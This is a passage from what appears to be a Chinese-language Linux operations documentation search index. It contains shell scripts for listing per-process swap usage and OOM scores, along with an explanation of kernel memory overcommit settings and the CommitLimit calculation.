\u62ff\u51fa/proc\u76ee\u5f55\u4e0b\u6240\u6709\u4ee5\u6570\u5b57\u4e3a\u540d\u7684\u76ee\u5f55\uff08\u8fdb\u7a0b\u540d\u662f\u6570\u5b57\u624d\u662f\u8fdb\u7a0b\uff0c\u5176\u4ed6\u5982sys,net\u7b49\u5b58\u653e\u7684\u662f\u5176\u4ed6\u4fe1\u606f\uff09 for pid in `ls -l /proc|awk '/^d/ {print $NF}'|grep ^[0-9]` do # Do not check init process if [ $pid -eq 1 ];then continue;fi # \u5224\u65ad\u6539\u8fdb\u7a0b\u662f\u5426\u5360\u7528\u4e86swap grep -q \"Swap\" /proc/$pid/smaps 2>/dev/null if [ $? -eq 0 ];then # \u5982\u679c\u5360\u7528\u4e86swap swap=$(grep Swap /proc/$pid/smaps| gawk '{ sum+=$2} END{ print sum }') # \u8fdb\u7a0b\u540d #proc_name=$(ps aux | grep -w \"$pid\" | grep -v grep proc_name=$(ps -eo pid,comm | grep -w \"$pid\" | grep -v grep|awk '{print $NF}') if [ $swap -ge 0 ];then # \u5982\u679c\u5360\u7528\u4e86swap\u5219\u8f93\u51fa\u5176\u4fe1\u606f echo -e \"$pid\\t${swap}\\t$proc_name\" fi fi done | sort -k2 -n | gawk -F'\\t' '{ pid[NR]=$1; size[NR]=$2; name[NR]=$3; } END{ for(id=1;id<=length(pid);id++) { if(size[id]<1024) printf(\"%-10s\\t%10sKB\\t%s\\n\",pid[id],size[id],name[id]); else if(size[id]<1048576) printf(\"%-10s\\t%10.2fMB\\t%s\\n\",pid[id],size[id]/1024,name[id]); else printf(\"%-10s\\t%10.2fGB\\t%s\\n\",pid[id],size[id]/1048576,name[id]); } }' \u7ed3\u679c\uff1a PID Swap Proc_Name 10519 0KB pickup 10579 0KB sshd 10581 0KB bash 1101 0KB dhclient 1168 0KB iscsid 1169 0KB tuned 1171 0KB rshim","title":"\u7b2c\u4e00\u79cd\u811a\u672c"},{"location":"system/linux/%E5%86%85%E5%AD%98/%E6%9F%A5%E7%9C%8B%E8%BF%9B%E7%A8%8Bswap%E4%BD%BF%E7%94%A8%E7%9A%84%E8%84%9A%E6%9C%AC/#_2","text":"for i in $(ls /proc 2>/dev/null | grep \"^[0-9]\" ); do awk '/Swap:/{a=a+$2}END{print '\"$i\"',a/1024\"M\"}' /proc/$i/smaps;done 2>/dev/null | sort -k2nr \u7ed3\u679c\uff1a 10092 0M 10 0M 10519 0M 10579 0M 10581 0M 10666 0M 10754 0M 10801 0M 1 0M","title":"\u7b2c\u4e8c\u79cd\u811a\u672c"},{"location":"system/linux/%E5%86%85%E5%AD%98/%E8%AE%A1%E7%AE%97oom%E8%AF%84%E5%88%86%E7%9A%84%E8%84%9A%E6%9C%AC/","text":"\u67e5\u770bOOM\u8bc4\u5206\u7684\u811a\u672c /proc/ /oom_score\u5185\u6838\u901a\u8fc7\u5185\u5b58\u6d88\u8017\u8ba1\u7b97\u5f97\u51fa /proc/ /oom_score_adj\u5141\u8bb8\u7528\u4e8e\u81ea\u5b9a\u4e49\uff0c\u7b49\u540c\u4e8e\u4f18\u5148\u7ea7\uff0c\u4f18\u5148\u7ea7\u8d8a\u9ad8\u503c\u8d8a\u5c0f\uff08-1000 ~1000\uff09\u3002 /proc/ /oom_adj\u91cc\u9762\uff0c\u53d6\u503c\u662f-17\u5230+15(\u4e3a-17\u6b64\u8fdb\u7a0b\u4e0d\u4f1a\u88ab\u6740\u6389)\uff0c\u53d6\u503c\u8d8a\u9ad8\uff0c\u8d8a\u5bb9\u6613\u88ab\u6740\u6389\u3002 #!/bin/bash # Displays running processes in descending order of OOM score printf 'PID\\tOOM Score\\tOOM Score Adj\\tCommand\\n' echo -n \"$(ps -e -o pid= -o comm= | sort -k 2nr)\" | while read line do pid=$(echo $line | awk '{print $1}') comm=$(echo $line | awk '{print $2}') [ -f /proc/$pid/oom_score ] && [ $(cat /proc/$pid/oom_score) != 0 ] && printf '%d\\t%d\\t\\t%d\\t%s\\n' \"$pid\" \"$(cat /proc/$pid/oom_score)\" \"$(cat /proc/$pid/oom_score_adj)\" \"$comm\" done OOM Score\u8d8a\u9ad8\u7684\u5148\u6740\u6b7b\uff0cOOM Score Adj\u9ed8\u8ba4\u4e3a0\uff0c\u5206\u6570\u8d8a\u4f4e\u8d8a\u4e0d\u5bb9\u6613\u6740\u6b7b PID OOM Score OOM Score Adj Command 1169 2 0 tuned 1231 2 0 rsyslogd 1847 2 0 YDLive 1858 7 0 YDService 1911 2 0 sh 406 3 0 systemd-journal 710 \u22021 0 polkitd \u66f4\u5168\u7684\u811a\u672c #!/bin/bash # Displays running processes in descending order of OOM score printf 'PID\\tOOM Score\\tOOM Score Adj\\tOOM_Adj\\tCommand\\n' echo -n \"$(ps -e -o pid= -o comm= | sort -k 2nr)\" | while read line do pid=$(echo $line | awk '{print $1}') comm=$(echo $line | awk '{print $2}') [ -f /proc/$pid/oom_score ] && [ $(cat /proc/$pid/oom_score) != 0 ] && printf '%d\\t%d\\t\\t%d\\t\\t%d\\t%s\\n' \"$pid\" \"$(cat /proc/$pid/oom_score)\" \"$(cat /proc/$pid/oom_score_adj)\" \"$(cat /proc/$pid/oom_adj)\" \"$comm\" done OOM Score\u8d8a\u9ad8\u7684\u5148\u6740\u6b7b\uff0cOOM Score Adj\u9ed8\u8ba4\u4e3a0\uff0c\u5206\u6570\u8d8a\u4f4e\u8d8a\u4e0d\u5bb9\u6613\u6740\u6b7b\u3002oom_adj\u91cc\u9762\uff0c\u53d6\u503c\u662f-17\u5230+15(\u4e3a-17\u6b64\u8fdb\u7a0b\u4e0d\u4f1a\u88ab\u6740\u6389)\uff0c\u53d6\u503c\u8d8a\u9ad8\uff0c\u8d8a\u5bb9\u6613\u88ab\u6740\u6389\u3002 PID OOM Score OOM Score Adj OOM_Adj Command 1169 2 0 0 tuned 1231 2 0 0 rsyslogd 1847 2 0 0 YDLive 1858 7 0 0 YDService 1911 2 0 0 sh 406 3 0 0 systemd-journal 710 1 0 0 polkitd \u67e5\u770b\u67d0\u8fdb\u7a0b\u7684Rss\u5185\u5b58\u4f7f\u7528\u91cf awk '/Rss:/{a=a+$2}END{print a/1024\"M\"}' /proc/PID\u53f7/smaps \u67e5\u770b\u67d0\u8fdb\u7a0b\u7684swap\u5185\u5b58\u4f7f\u7528\u91cf awk '/Swap:/{a=a+$2}END{print a/1024\"M\"}' /proc/PID\u53f7/smaps","title":"\u8ba1\u7b97oom\u8bc4\u5206\u7684\u811a\u672c"},{"location":"system/linux/%E5%86%85%E5%AD%98/%E8%AE%A1%E7%AE%97oom%E8%AF%84%E5%88%86%E7%9A%84%E8%84%9A%E6%9C%AC/#oom","text":"/proc/ /oom_score\u5185\u6838\u901a\u8fc7\u5185\u5b58\u6d88\u8017\u8ba1\u7b97\u5f97\u51fa /proc/ /oom_score_adj\u5141\u8bb8\u7528\u4e8e\u81ea\u5b9a\u4e49\uff0c\u7b49\u540c\u4e8e\u4f18\u5148\u7ea7\uff0c\u4f18\u5148\u7ea7\u8d8a\u9ad8\u503c\u8d8a\u5c0f\uff08-1000 ~1000\uff09\u3002 /proc/ /oom_adj\u91cc\u9762\uff0c\u53d6\u503c\u662f-17\u5230+15(\u4e3a-17\u6b64\u8fdb\u7a0b\u4e0d\u4f1a\u88ab\u6740\u6389)\uff0c\u53d6\u503c\u8d8a\u9ad8\uff0c\u8d8a\u5bb9\u6613\u88ab\u6740\u6389\u3002 #!/bin/bash # Displays running processes in descending order of OOM score printf 'PID\\tOOM Score\\tOOM Score Adj\\tCommand\\n' echo -n \"$(ps -e -o pid= -o comm= | sort -k 2nr)\" | while read line do pid=$(echo $line | awk '{print $1}') comm=$(echo $line | awk '{print $2}') [ -f /proc/$pid/oom_score ] && [ $(cat /proc/$pid/oom_score) != 0 ] && printf '%d\\t%d\\t\\t%d\\t%s\\n' \"$pid\" \"$(cat /proc/$pid/oom_score)\" \"$(cat /proc/$pid/oom_score_adj)\" \"$comm\" done OOM Score\u8d8a\u9ad8\u7684\u5148\u6740\u6b7b\uff0cOOM Score Adj\u9ed8\u8ba4\u4e3a0\uff0c\u5206\u6570\u8d8a\u4f4e\u8d8a\u4e0d\u5bb9\u6613\u6740\u6b7b PID OOM Score OOM Score Adj Command 1169 2 0 tuned 1231 2 0 rsyslogd 1847 2 0 YDLive 1858 7 0 YDService 1911 2 0 sh 406 3 0 systemd-journal 710 \u22021 0 polkitd","title":"\u67e5\u770bOOM\u8bc4\u5206\u7684\u811a\u672c"},{"location":"system/linux/%E5%86%85%E5%AD%98/%E8%AE%A1%E7%AE%97oom%E8%AF%84%E5%88%86%E7%9A%84%E8%84%9A%E6%9C%AC/#_1","text":"#!/bin/bash # Displays running processes in descending order of OOM score printf 'PID\\tOOM Score\\tOOM Score Adj\\tOOM_Adj\\tCommand\\n' echo -n \"$(ps -e -o pid= -o comm= | sort -k 2nr)\" | while read line do pid=$(echo $line | awk '{print $1}') comm=$(echo $line | awk '{print $2}') [ -f /proc/$pid/oom_score ] && [ $(cat /proc/$pid/oom_score) != 0 ] && printf '%d\\t%d\\t\\t%d\\t\\t%d\\t%s\\n' \"$pid\" \"$(cat /proc/$pid/oom_score)\" \"$(cat /proc/$pid/oom_score_adj)\" \"$(cat /proc/$pid/oom_adj)\" \"$comm\" done OOM Score\u8d8a\u9ad8\u7684\u5148\u6740\u6b7b\uff0cOOM Score Adj\u9ed8\u8ba4\u4e3a0\uff0c\u5206\u6570\u8d8a\u4f4e\u8d8a\u4e0d\u5bb9\u6613\u6740\u6b7b\u3002oom_adj\u91cc\u9762\uff0c\u53d6\u503c\u662f-17\u5230+15(\u4e3a-17\u6b64\u8fdb\u7a0b\u4e0d\u4f1a\u88ab\u6740\u6389)\uff0c\u53d6\u503c\u8d8a\u9ad8\uff0c\u8d8a\u5bb9\u6613\u88ab\u6740\u6389\u3002 PID OOM Score OOM Score Adj OOM_Adj Command 1169 2 0 0 tuned 1231 2 0 0 rsyslogd 1847 2 0 0 YDLive 1858 7 0 0 YDService 1911 2 0 0 sh 406 3 0 0 systemd-journal 710 1 0 0 polkitd \u67e5\u770b\u67d0\u8fdb\u7a0b\u7684Rss\u5185\u5b58\u4f7f\u7528\u91cf awk '/Rss:/{a=a+$2}END{print a/1024\"M\"}' /proc/PID\u53f7/smaps \u67e5\u770b\u67d0\u8fdb\u7a0b\u7684swap\u5185\u5b58\u4f7f\u7528\u91cf awk '/Swap:/{a=a+$2}END{print a/1024\"M\"}' /proc/PID\u53f7/smaps","title":"\u66f4\u5168\u7684\u811a\u672c"},{"location":"system/linux/%E5%86%85%E5%AD%98/%E8%BF%87%E5%BA%A6%E5%88%86%E9%85%8D%E7%9A%84%E7%90%86%E8%A7%A3/","text":"\u8fc7\u5ea6\u5206\u914d\u7684\u7406\u89e3 Memory Overcommit\u7684\u610f\u601d\u662f\u64cd\u4f5c\u7cfb\u7edf\u627f\u8bfa\u7ed9\u8fdb\u7a0b\u7684\u5185\u5b58\u5927\u5c0f\u8d85\u8fc7\u4e86\u5b9e\u9645\u53ef\u7528\u7684\u5185\u5b58\u3002\u4e00\u4e2a\u4fdd\u5b88\u7684\u64cd\u4f5c\u7cfb\u7edf\u4e0d\u4f1a\u5141\u8bb8memory overcommit\uff0c\u6709\u591a\u5c11\u5c31\u5206\u914d\u591a\u5c11\uff0c\u518d\u7533\u8bf7\u5c31\u6ca1\u6709\u4e86\uff0c\u8fd9\u5176\u5b9e\u6709\u4e9b\u6d6a\u8d39\u5185\u5b58\uff0c\u56e0\u4e3a\u8fdb\u7a0b\u5b9e\u9645\u4f7f\u7528\u5230\u7684\u5185\u5b58\u5f80\u5f80\u6bd4\u7533\u8bf7\u7684\u5185\u5b58\u8981\u5c11\uff0c\u6bd4\u5982\u67d0\u4e2a\u8fdb\u7a0bmalloc()\u4e86200MB\u5185\u5b58\uff0c\u4f46\u5b9e\u9645\u4e0a\u53ea\u7528\u5230\u4e86100MB\uff0c\u6309\u7167UNIX/Linux\u7684\u7b97\u6cd5\uff0c\u7269\u7406\u5185\u5b58\u9875\u7684\u5206\u914d\u53d1\u751f\u5728\u4f7f\u7528\u7684\u77ac\u95f4\uff0c\u800c\u4e0d\u662f\u5728\u7533\u8bf7\u7684\u77ac\u95f4\uff0c\u4e5f\u5c31\u662f\u8bf4\u672a\u7528\u5230\u7684100MB\u5185\u5b58\u6839\u672c\u5c31\u6ca1\u6709\u5206\u914d\uff0c\u8fd9100MB\u5185\u5b58\u5c31\u95f2\u7f6e\u4e86\u3002\u4e0b\u9762\u8fd9\u4e2a\u6982\u5ff5\u5f88\u91cd\u8981\uff0c\u662f\u7406\u89e3memory overcommit\u7684\u5173\u952e\uff1acommit(\u6216overcommit)\u9488\u5bf9\u7684\u662f\u5185\u5b58\u7533\u8bf7\uff0c\u5185\u5b58\u7533\u8bf7\u4e0d\u7b49\u4e8e\u5185\u5b58\u5206\u914d\uff0c\u5185\u5b58\u53ea\u5728\u5b9e\u9645\u7528\u5230\u7684\u65f6\u5019\u624d\u5206\u914d\u3002 Linux\u662f\u5141\u8bb8memory overcommit\u7684\uff0c\u53ea\u8981\u4f60\u6765\u7533\u8bf7\u5185\u5b58\u6211\u5c31\u7ed9\u4f60\uff0c\u5bc4\u5e0c\u671b\u4e8e\u8fdb\u7a0b\u5b9e\u9645\u4e0a\u7528\u4e0d\u5230\u90a3\u4e48\u591a\u5185\u5b58\uff0c\u4f46\u4e07\u4e00\u7528\u5230\u90a3\u4e48\u591a\u4e86\u5462\uff1f\u90a3\u5c31\u4f1a\u53d1\u751f\u7c7b\u4f3c\u201c\u94f6\u884c\u6324\u5151\u201d\u7684\u5371\u673a\uff0c\u73b0\u91d1(\u5185\u5b58)\u4e0d\u8db3\u4e86\u3002Linux\u8bbe\u8ba1\u4e86\u4e00\u4e2aOOM killer\u673a\u5236(OOM = out-of-memory)\u6765\u5904\u7406\u8fd9\u79cd\u5371\u673a\uff1b\u6311\u9009\u4e00\u4e2a\u8fdb\u7a0b\u51fa\u6765\u6740\u6b7b\uff0c\u4ee5\u817e\u51fa\u90e8\u5206\u5185\u5b58\uff0c\u5982\u679c\u8fd8\u4e0d\u591f\u5c31\u7ee7\u7eed\u6740\u3002\u3002\u3002\u4e5f\u53ef\u901a\u8fc7\u8bbe\u7f6e\u5185\u6838\u53c2\u6570 vm.panic_on_oom \u4f7f\u5f97\u53d1\u751fOOM\u65f6\u81ea\u52a8\u91cd\u542f\u7cfb\u7edf\u3002\u8fd9\u90fd\u662f\u6709\u98ce\u9669\u7684\u673a\u5236\uff0c\u91cd\u542f\u6709\u53ef\u80fd\u9020\u6210\u4e1a\u52a1\u4e2d\u65ad\uff0c\u6740\u6b7b\u8fdb\u7a0b\u4e5f\u6709\u53ef\u80fd\u5bfc\u81f4\u4e1a\u52a1\u4e2d\u65ad vm.overcommit_memory \u53c2\u6570 vm.overcommit_memory = 0 vm.overcommit_memory = 1 vm.overcommit_memory = 2 0 \u9ed8\u8ba4\u8bbe\u7f6e\uff0c\u5141\u8bb8\u7528\u6237\u8f7b\u5fae\u7684overcommit. \u5b83\u5141\u8bb8overcommit\uff0c\u4f46\u8fc7\u4e8e\u660e\u76ee\u5f20\u80c6\u7684overcommit\u4f1a\u88ab\u62d2\u7edd\uff0c\u6bd4\u5982malloc\u4e00\u6b21\u6027\u7533\u8bf7\u7684\u5185\u5b58\u5927\u5c0f\u5c31\u8d85\u8fc7\u4e86\u7cfb\u7edf\u603b\u5185\u5b58\u3002\u5355\u6b21\u7533\u8bf7\u7684\u5185\u5b58\u5927\u5c0f\u4e0d\u80fd\u8d85\u8fc7 \u3010free memory + free swap + pagecache\u7684\u5927\u5c0f + SLAB\u4e2d\u53ef\u56de\u6536\u7684\u90e8\u5206\u3011\uff0c\u5426\u5219\u672c\u6b21\u7533\u8bf7\u5c31\u4f1a\u5931\u8d25\u3002 1 \u5141\u8bb8overcommit \u5373\u5141\u8bb8\u5206\u914d\u6240\u6709\u7684\u7269\u7406\u5185\u5b58\uff0c\u800c\u4e0d\u7ba1\u5f53\u524d\u7684\u5185\u5b58\u72b6\u6001\u5982\u4f55\u3002 \u4f7f\u7528\u8fd9\u4e2a\u8bbe\u7f6e\u4f1a\u589e\u5927\u5185\u5b58\u8d85\u8f7d\u7684\u53ef\u80fd\u6027\uff0c\u4f46\u4e5f\u53ef\u4ee5\u589e\u5f3a\u5927\u91cf\u4f7f\u7528\u5185\u5b58\u4efb\u52a1\u7684\u6027\u80fd\u3002 2 \u4e0d\u5141\u8bb8\u8fc7\u5ea6 overcommit \u5f53\u7cfb\u7edf\u5206\u914d\u7684\u5185\u5b58\u8d85\u8fc7swap+N%*\u7269\u7406RAM(N%\u7531vm.overcommit_ratio\u51b3\u5b9a)\u65f6\uff0c\u4f1a\u62d2\u7edd\u5206\u914d vm.overcommit_ratio \u53c2\u6570 vm.overcommit_memory=2\u624d\u751f\u6548 vm.overcommit_ratio \u662f\u5185\u6838\u53c2\u6570\uff0c\u7f3a\u7701\u503c\u662f50\uff0c\u8868\u793a\u7269\u7406\u5185\u5b58\u768450%\u3002\u5982\u679c\u4f60\u4e0d\u60f3\u4f7f\u7528\u6bd4\u7387\uff0c\u4e5f\u53ef\u4ee5\u76f4\u63a5\u6307\u5b9a\u5185\u5b58\u7684\u5b57\u8282\u6570\u5927\u5c0f\uff0c\u901a\u8fc7\u53e6\u4e00\u4e2a\u5185\u6838\u53c2\u6570 vm.overcommit_kbytes \u5373\u53ef\uff1b \u516c\u5f0f\uff1aCommitLimit = (Physical RAM * vm.overcommit_ratio / 100) + Swap \u5982\u679c\u4f7f\u7528\u4e86huge pages\uff0c\u90a3\u4e48\u9700\u8981\u4ece\u7269\u7406\u5185\u5b58\u4e2d\u51cf\u53bb\uff0c\u516c\u5f0f\u53d8\u6210\uff1a CommitLimit = ([total RAM] \u2013 [total huge TLB RAM]) * vm.overcommit_ratio / 100 + swap \u8be6\u89c1\uff1a What is the formula to calculate \"CommitLimit\" value on Red Hat Enterprise Linux 5 and 6 ? - Red Hat Customer Portal \u67e5\u770b\u7cfb\u7edf overcommit \u4fe1\u606f # cat /proc/meminfo |grep -i commit CommitLimit: 90971304 kB Committed_AS: 64872556 kB CommitLimit\uff1a\u6700\u5927\u80fd\u5206\u914d\u7684\u5185\u5b58\uff0c\u5177\u4f53\u7684\u503c\u662f SWAP\u5185\u5b58\u5927\u5c0f + \u7269\u7406\u5185\u5b58 * overcommit_ratio / 100\u3002CommitLimit \u5c31\u662fovercommit\u7684\u9608\u503c\uff0c\u7533\u8bf7\u7684\u5185\u5b58\u603b\u6570\u8d85\u8fc7CommitLimit\u7684\u8bdd\u5c31\u7b97\u662fovercommit\u3002(vm.overcommit_memory=2)\u65f6\u5c31\u4f1a\u7981\u6b62overcommit Committed_AS\uff1a\u5f53\u524d\u5df2\u7ecf\u5206\u914d\u7684\u5185\u5b58\u5927\u5c0f\u3002Committed_AS \u8868\u793a\u6240\u6709\u8fdb\u7a0b\u5df2\u7ecf\u7533\u8bf7\u7684\u5185\u5b58\u603b\u5927\u5c0f\uff0c\uff08\u6ce8\u610f\u662f\u5df2\u7ecf\u7533\u8bf7\u7684\uff0c\u4e0d\u662f\u5df2\u7ecf\u5206\u914d\u7684\uff09\uff0c\u5982\u679c Committed_AS \u8d85\u8fc7 CommitLimit \u5c31\u8868\u793a\u53d1\u751f\u4e86 overcommit\uff0c\u8d85\u51fa\u8d8a\u591a\u8868\u793a overcommit \u8d8a\u4e25\u91cd\u3002Committed_AS \u7684\u542b\u4e49\u6362\u4e00\u79cd\u8bf4\u6cd5\u5c31\u662f\uff0c\u5982\u679c\u8981\u7edd\u5bf9\u4fdd\u8bc1\u4e0d\u53d1\u751fOOM (out of memory) \u9700\u8981\u591a\u5c11\u7269\u7406\u5185\u5b58\u3002 sar -r \u662f\u67e5\u770b\u5185\u5b58\u4f7f\u7528\u72b6\u51b5\u7684\u5e38\u7528\u5de5\u5177\uff0c\u5b83\u7684\u8f93\u51fa\u7ed3\u679c\u4e2d\u6709\u4e24\u4e2a\u4e0eovercommit\u6709\u5173\uff0ckbcommit \u548c %commit\uff1a kbcommit\u5bf9\u5e94/proc/meminfo\u4e2d\u7684 Committed_AS\uff1b %commit\u7684\u8ba1\u7b97\u516c\u5f0f\u5e76\u6ca1\u6709\u91c7\u7528 CommitLimit\u4f5c\u5206\u6bcd\uff0c\u800c\u662fCommitted_AS/(MemTotal+SwapTotal)\uff0c\u610f\u601d\u662f_\u5185\u5b58\u7533\u8bf7_\u5360_\u7269\u7406\u5185\u5b58\u4e0e\u4ea4\u6362\u533a\u4e4b\u548c_\u7684\u767e\u5206\u6bd4\u3002 $ sar -r 05:00:01 PM kbmemfree kbmemused %memused kbbuffers kbcached kbcommit %commit kbactive kbinact kbdirty 05:10:01 PM 160576 3648460 95.78 0 1846212 4939368 62.74 1390292 1854880 4 \u7406\u89e3Linux\u7684memory overcommit | Linux Performance","title":"\u8fc7\u5ea6\u5206\u914d\u7684\u7406\u89e3"},{"location":"system/linux/%E5%86%85%E5%AD%98/%E8%BF%87%E5%BA%A6%E5%88%86%E9%85%8D%E7%9A%84%E7%90%86%E8%A7%A3/#_1","text":"Memory Overcommit\u7684\u610f\u601d\u662f\u64cd\u4f5c\u7cfb\u7edf\u627f\u8bfa\u7ed9\u8fdb\u7a0b\u7684\u5185\u5b58\u5927\u5c0f\u8d85\u8fc7\u4e86\u5b9e\u9645\u53ef\u7528\u7684\u5185\u5b58\u3002\u4e00\u4e2a\u4fdd\u5b88\u7684\u64cd\u4f5c\u7cfb\u7edf\u4e0d\u4f1a\u5141\u8bb8memory overcommit\uff0c\u6709\u591a\u5c11\u5c31\u5206\u914d\u591a\u5c11\uff0c\u518d\u7533\u8bf7\u5c31\u6ca1\u6709\u4e86\uff0c\u8fd9\u5176\u5b9e\u6709\u4e9b\u6d6a\u8d39\u5185\u5b58\uff0c\u56e0\u4e3a\u8fdb\u7a0b\u5b9e\u9645\u4f7f\u7528\u5230\u7684\u5185\u5b58\u5f80\u5f80\u6bd4\u7533\u8bf7\u7684\u5185\u5b58\u8981\u5c11\uff0c\u6bd4\u5982\u67d0\u4e2a\u8fdb\u7a0bmalloc()\u4e86200MB\u5185\u5b58\uff0c\u4f46\u5b9e\u9645\u4e0a\u53ea\u7528\u5230\u4e86100MB\uff0c\u6309\u7167UNIX/Linux\u7684\u7b97\u6cd5\uff0c\u7269\u7406\u5185\u5b58\u9875\u7684\u5206\u914d\u53d1\u751f\u5728\u4f7f\u7528\u7684\u77ac\u95f4\uff0c\u800c\u4e0d\u662f\u5728\u7533\u8bf7\u7684\u77ac\u95f4\uff0c\u4e5f\u5c31\u662f\u8bf4\u672a\u7528\u5230\u7684100MB\u5185\u5b58\u6839\u672c\u5c31\u6ca1\u6709\u5206\u914d\uff0c\u8fd9100MB\u5185\u5b58\u5c31\u95f2\u7f6e\u4e86\u3002\u4e0b\u9762\u8fd9\u4e2a\u6982\u5ff5\u5f88\u91cd\u8981\uff0c\u662f\u7406\u89e3memory overcommit\u7684\u5173\u952e\uff1acommit(\u6216overcommit)\u9488\u5bf9\u7684\u662f\u5185\u5b58\u7533\u8bf7\uff0c\u5185\u5b58\u7533\u8bf7\u4e0d\u7b49\u4e8e\u5185\u5b58\u5206\u914d\uff0c\u5185\u5b58\u53ea\u5728\u5b9e\u9645\u7528\u5230\u7684\u65f6\u5019\u624d\u5206\u914d\u3002 Linux\u662f\u5141\u8bb8memory overcommit\u7684\uff0c\u53ea\u8981\u4f60\u6765\u7533\u8bf7\u5185\u5b58\u6211\u5c31\u7ed9\u4f60\uff0c\u5bc4\u5e0c\u671b\u4e8e\u8fdb\u7a0b\u5b9e\u9645\u4e0a\u7528\u4e0d\u5230\u90a3\u4e48\u591a\u5185\u5b58\uff0c\u4f46\u4e07\u4e00\u7528\u5230\u90a3\u4e48\u591a\u4e86\u5462\uff1f\u90a3\u5c31\u4f1a\u53d1\u751f\u7c7b\u4f3c\u201c\u94f6\u884c\u6324\u5151\u201d\u7684\u5371\u673a\uff0c\u73b0\u91d1(\u5185\u5b58)\u4e0d\u8db3\u4e86\u3002Linux\u8bbe\u8ba1\u4e86\u4e00\u4e2aOOM killer\u673a\u5236(OOM = out-of-memory)\u6765\u5904\u7406\u8fd9\u79cd\u5371\u673a\uff1b\u6311\u9009\u4e00\u4e2a\u8fdb\u7a0b\u51fa\u6765\u6740\u6b7b\uff0c\u4ee5\u817e\u51fa\u90e8\u5206\u5185\u5b58\uff0c\u5982\u679c\u8fd8\u4e0d\u591f\u5c31\u7ee7\u7eed\u6740\u3002\u3002\u3002\u4e5f\u53ef\u901a\u8fc7\u8bbe\u7f6e\u5185\u6838\u53c2\u6570 vm.panic_on_oom \u4f7f\u5f97\u53d1\u751fOOM\u65f6\u81ea\u52a8\u91cd\u542f\u7cfb\u7edf\u3002\u8fd9\u90fd\u662f\u6709\u98ce\u9669\u7684\u673a\u5236\uff0c\u91cd\u542f\u6709\u53ef\u80fd\u9020\u6210\u4e1a\u52a1\u4e2d\u65ad\uff0c\u6740\u6b7b\u8fdb\u7a0b\u4e5f\u6709\u53ef\u80fd\u5bfc\u81f4\u4e1a\u52a1\u4e2d\u65ad","title":"\u8fc7\u5ea6\u5206\u914d\u7684\u7406\u89e3"},{"location":"system/linux/%E5%86%85%E5%AD%98/%E8%BF%87%E5%BA%A6%E5%88%86%E9%85%8D%E7%9A%84%E7%90%86%E8%A7%A3/#vmovercommit_memory","text":"vm.overcommit_memory = 0 vm.overcommit_memory = 1 vm.overcommit_memory = 2 0 \u9ed8\u8ba4\u8bbe\u7f6e\uff0c\u5141\u8bb8\u7528\u6237\u8f7b\u5fae\u7684overcommit. \u5b83\u5141\u8bb8overcommit\uff0c\u4f46\u8fc7\u4e8e\u660e\u76ee\u5f20\u80c6\u7684overcommit\u4f1a\u88ab\u62d2\u7edd\uff0c\u6bd4\u5982malloc\u4e00\u6b21\u6027\u7533\u8bf7\u7684\u5185\u5b58\u5927\u5c0f\u5c31\u8d85\u8fc7\u4e86\u7cfb\u7edf\u603b\u5185\u5b58\u3002\u5355\u6b21\u7533\u8bf7\u7684\u5185\u5b58\u5927\u5c0f\u4e0d\u80fd\u8d85\u8fc7 \u3010free memory + free swap + pagecache\u7684\u5927\u5c0f + SLAB\u4e2d\u53ef\u56de\u6536\u7684\u90e8\u5206\u3011\uff0c\u5426\u5219\u672c\u6b21\u7533\u8bf7\u5c31\u4f1a\u5931\u8d25\u3002 1 \u5141\u8bb8overcommit \u5373\u5141\u8bb8\u5206\u914d\u6240\u6709\u7684\u7269\u7406\u5185\u5b58\uff0c\u800c\u4e0d\u7ba1\u5f53\u524d\u7684\u5185\u5b58\u72b6\u6001\u5982\u4f55\u3002 \u4f7f\u7528\u8fd9\u4e2a\u8bbe\u7f6e\u4f1a\u589e\u5927\u5185\u5b58\u8d85\u8f7d\u7684\u53ef\u80fd\u6027\uff0c\u4f46\u4e5f\u53ef\u4ee5\u589e\u5f3a\u5927\u91cf\u4f7f\u7528\u5185\u5b58\u4efb\u52a1\u7684\u6027\u80fd\u3002 2 \u4e0d\u5141\u8bb8\u8fc7\u5ea6 overcommit \u5f53\u7cfb\u7edf\u5206\u914d\u7684\u5185\u5b58\u8d85\u8fc7swap+N%*\u7269\u7406RAM(N%\u7531vm.overcommit_ratio\u51b3\u5b9a)\u65f6\uff0c\u4f1a\u62d2\u7edd\u5206\u914d","title":"vm.overcommit_memory \u53c2\u6570"},{"location":"system/linux/%E5%86%85%E5%AD%98/%E8%BF%87%E5%BA%A6%E5%88%86%E9%85%8D%E7%9A%84%E7%90%86%E8%A7%A3/#vmovercommit_ratio","text":"vm.overcommit_memory=2\u624d\u751f\u6548 vm.overcommit_ratio \u662f\u5185\u6838\u53c2\u6570\uff0c\u7f3a\u7701\u503c\u662f50\uff0c\u8868\u793a\u7269\u7406\u5185\u5b58\u768450%\u3002\u5982\u679c\u4f60\u4e0d\u60f3\u4f7f\u7528\u6bd4\u7387\uff0c\u4e5f\u53ef\u4ee5\u76f4\u63a5\u6307\u5b9a\u5185\u5b58\u7684\u5b57\u8282\u6570\u5927\u5c0f\uff0c\u901a\u8fc7\u53e6\u4e00\u4e2a\u5185\u6838\u53c2\u6570 vm.overcommit_kbytes \u5373\u53ef\uff1b \u516c\u5f0f\uff1aCommitLimit = (Physical RAM * vm.overcommit_ratio / 100) + Swap \u5982\u679c\u4f7f\u7528\u4e86huge pages\uff0c\u90a3\u4e48\u9700\u8981\u4ece\u7269\u7406\u5185\u5b58\u4e2d\u51cf\u53bb\uff0c\u516c\u5f0f\u53d8\u6210\uff1a CommitLimit = ([total RAM] \u2013 [total huge TLB RAM]) * vm.overcommit_ratio / 100 + swap \u8be6\u89c1\uff1a What is the formula to calculate \"CommitLimit\" value on Red Hat Enterprise Linux 5 and 6 ? - Red Hat Customer Portal \u67e5\u770b\u7cfb\u7edf overcommit \u4fe1\u606f # cat /proc/meminfo |grep -i commit CommitLimit: 90971304 kB Committed_AS: 64872556 kB CommitLimit\uff1a\u6700\u5927\u80fd\u5206\u914d\u7684\u5185\u5b58\uff0c\u5177\u4f53\u7684\u503c\u662f SWAP\u5185\u5b58\u5927\u5c0f + \u7269\u7406\u5185\u5b58 * overcommit_ratio / 100\u3002CommitLimit \u5c31\u662fovercommit\u7684\u9608\u503c\uff0c\u7533\u8bf7\u7684\u5185\u5b58\u603b\u6570\u8d85\u8fc7CommitLimit\u7684\u8bdd\u5c31\u7b97\u662fovercommit\u3002(vm.overcommit_memory=2)\u65f6\u5c31\u4f1a\u7981\u6b62overcommit 